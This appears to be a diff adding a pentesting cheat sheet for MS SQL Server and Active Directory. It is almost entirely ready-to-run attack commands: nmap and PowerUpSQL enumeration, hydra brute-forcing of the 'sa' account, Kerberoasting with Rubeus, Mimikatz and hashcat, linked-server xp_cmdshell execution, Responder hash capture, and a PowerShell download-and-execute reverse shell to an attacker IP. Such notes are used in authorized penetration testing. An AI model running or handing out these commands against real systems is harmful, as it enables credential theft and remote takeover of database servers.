@@ -1,0 +1,76 @@
+# MS SQL Server nmap scan
+# more: https://www.hackingarticles.in/mssql-for-pentesternmap/
+nmap -p 1433 --script ms-sql-info 10.20.20.5
+
+# get info about MS SQL Servers in domain - PowerUpSQL
+import-module .\PowerUpSQL.psd1
+get-SQLInstanceDomain | Get-SQLServerInfo
+
+# hydra - bruteforce build-in MS SQL Server 'sa' account
+# more: https://www.hackingarticles.in/password-crackingms-sql/
+hydra -l 'sa' -P /usr/share/wordlists/rockyou.txt 10.20.20.5 mssql
+
+# kerberoasting
+# find SPNs
+# method 1 - PowerUpSQL
+import-module .\PowerUpSQL.psd1
+get-SQLInstanceDomain -verbose
+
+# method 2 - getUserSPNs
+.\GetUserSPNs.ps1
+
+# method 3 - Invoke-Kerberoast.ps1
+# obtained hashes can be cracked using 
+# more: 
+# https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/
+# https://node-security.com/posts/how-to-kerberoast/
+import-module .\Invoke-Kerberoast.ps1
+.\invoke-kerberoast
+.\hashcat64.exe -m 13100 -a 0 .\tickets.txt .\rockyou.txt
+
+# method 4 - Roubeus
+rubeus.exe kerberoast
+
+# method 5 - Mimikatz
+mimikatz.exe
+kerberos::list /export
+
+python.exe tgsrepcrack.py rockyou.txt ticket_from_mimikatz.kirbi
+
+# find linked MS SQL Servers - PowerUpSQL
+get-SQLServerLinkCrawl -instance prod1.tick.local
+get-SQLServerLinkCrawl -instance prod1.tick.local -query 'select @@version'
+
+# find linked MS SQL Servers
+select * from master..sysservers
+
+# make a query on linked server
+select * from openquery("prod2", 'select @@version')
+
+# exec stored procedure on linked server
+select * from openquery("prod2", 'exec master..xp_cmdshell ''whoami'' with result sets ((output nvarchar(max)))')
+
+# powershell revers shell from linked server (prod2) to attacker machine (10.20.20.100)
+#1 update Invoke-PowerShellTcp.ps1 script. Add at the end:
+Invoke-PowerShellTcp -reverse -ipaddress 10.20.20.100 -port 443
+#2 host Invoke-PowerShellTcp.ps1 on attacker machine. You can use HTTP File Server (https://www.rejetto.com/hfs/)
+#3 run netcat (powershell version) on attacker machine:
+.\powercat -l -p 443 -v -t 1000
+#4 exec stored procedure xp_cmdshell on linked server:
+select * from openquery("PROD2",'exec master..xp_cmdshell "powershell iex (new-object net.webclient).downloadstring(''http://10.20.20.100/Invoke-PowerShellTcp.ps1'')" WITH RESULT SETS ((output nvarchar(max)))')
+#5 hack
+
+# get NTLM hash with Responder
+# more: 
+# https://www.a2secure.com/en/blog/how-to-use-responder-to-capture-netntlm-and-grab-a-shell/
+# https://cornerpirate.com/2021/06/17/grabbing-ntlm-hashes-with-responder-then-what/
+#1 run responder on attacker Kali:
+Responder -I eth0
+#2 exec stored procedure xp_dirtree:
+exec xp_dirtree '\\10.20.20.7\aaaaa'
+#3 crack hash:
+hashcat -m 5600 hash.txt rockyou.txt
+
+
+
+
